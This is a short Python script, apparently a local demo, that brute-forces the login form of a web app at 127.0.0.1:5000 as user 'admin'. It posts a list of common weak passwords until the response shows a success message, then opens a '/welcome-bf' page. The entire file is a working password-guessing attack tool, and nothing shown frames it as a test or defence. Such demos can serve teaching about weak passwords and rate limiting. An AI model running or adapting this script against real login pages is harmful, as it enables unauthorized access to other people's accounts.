import requests
import webbrowser

URL = "http://127.0.0.1:5000/"
USERNAME = "admin"
PASSWORD_LIST = [
    "12345",
    "admin",
    "123456",
    "password",
    "qwerty",
    "letmein",
    "welcome",
    "abc123",
    "123456789",
]

for password in PASSWORD_LIST:
    response = requests.post(
        URL, data={"username": USERNAME, "password": password}, allow_redirects=True
    )

    if "Welcome! You have successfully logged in." in response.text:
        print(f"🔓 Bot successfully logged in with password: {password}")

        webbrowser.open("http://127.0.0.1:5000/welcome-bf")
        break
    else:
        print(f"❌ Attempt with password {password} failed")
